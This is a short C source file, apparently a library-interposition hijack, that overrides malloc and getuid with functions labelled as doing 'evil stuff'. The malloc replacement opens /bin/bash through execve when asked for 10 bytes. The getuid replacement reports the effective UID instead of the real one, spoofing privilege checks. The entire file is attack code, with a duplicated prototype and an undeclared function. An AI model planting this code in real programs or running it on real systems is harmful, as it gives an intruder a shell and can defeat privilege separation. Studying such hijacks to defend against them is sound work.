#include <stddef.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

/* PROTOTYPES */
int printf(const char *format, ...);
void *calloc(size_t nmemb, size_t size);
uid_t geteuid(void);
uid_t geteuid(void);

static void do_evil_stuff(void)
{
	uid_t e_uid;
	gid_t e_gid;

	e_uid = geteuid();
	e_gid = getegid();

	printf("Doing evil stuff as UID: %lu, GID: %lu!\n",
	       (unsigned long)e_uid, (unsigned long)e_gid);
}

void exec_bin_bash(void)
{
	char *const argv[1] = { NULL };
	char *const envp[1] = { NULL };

	execve("/bin/bash", argv, envp);
}

void *malloc(size_t size)
{
	do_evil_stuff();
	if (size == 10) {
		exec_bin_bash();
	}
	return calloc(1, size);
}

uid_t getuid(void)
{
	do_evil_stuff();
	return geteuid();
}
